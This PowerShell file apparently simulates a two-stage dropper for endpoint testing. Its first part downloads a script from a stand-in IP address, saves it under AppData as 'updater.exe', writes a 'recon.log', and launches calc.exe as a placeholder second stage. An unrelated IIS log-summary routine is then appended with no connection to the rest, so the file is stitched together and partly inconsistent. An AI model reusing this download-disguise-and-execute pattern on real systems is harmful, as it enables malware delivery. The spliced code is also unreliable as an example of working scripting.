
<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$DownloadUrl = "https://198.51.100.110/stage1.ps1",
    [string]$LocalPath = "$env:APPDATA\updater.exe",
    [string]$ActivityLog = "$env:TEMP\recon.log",
    [int]$RequestTimeout = 114
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 114
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $StageResult = Invoke-Stage1Download -SourceUrl $DownloadUrl -DestinationPath $LocalPath -TimeoutSec $RequestTimeout
    if ($StageResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $LocalPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $DownloadUrl
    Destination = $LocalPath
    TimeoutSec = $RequestTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Stage handoff finished"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Reading configuration values"
Write-Verbose "Starting workflow"
Write-Verbose "Operation completed"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Collecting host metadata"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "Stop"

$LogRoot    = 'D:\Logs\iis\W3SVC1'
$Days       = 7
$TopN       = 15
$OutputPath = 'C:\Logs\reports\iis-top-2025-01-20.csv'
$HtmlPath   = 'C:\Reports\iis-2025-01-20.html'


$cutoff = (Get-Date).AddDays(-$Days)
$logs = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
$entries = foreach ($log in $logs) {
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        [pscustomobject]@{ Status = [int]$parts[8]; Uri = $parts[3] }
    }
}

$entries | Group-Object Uri | Sort-Object Count -Descending |
    Select-Object -First $TopN Name, Count |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Parsed {0} lines from {1} files" -f @($entries).Count, @($logs).Count) -ForegroundColor Cyan
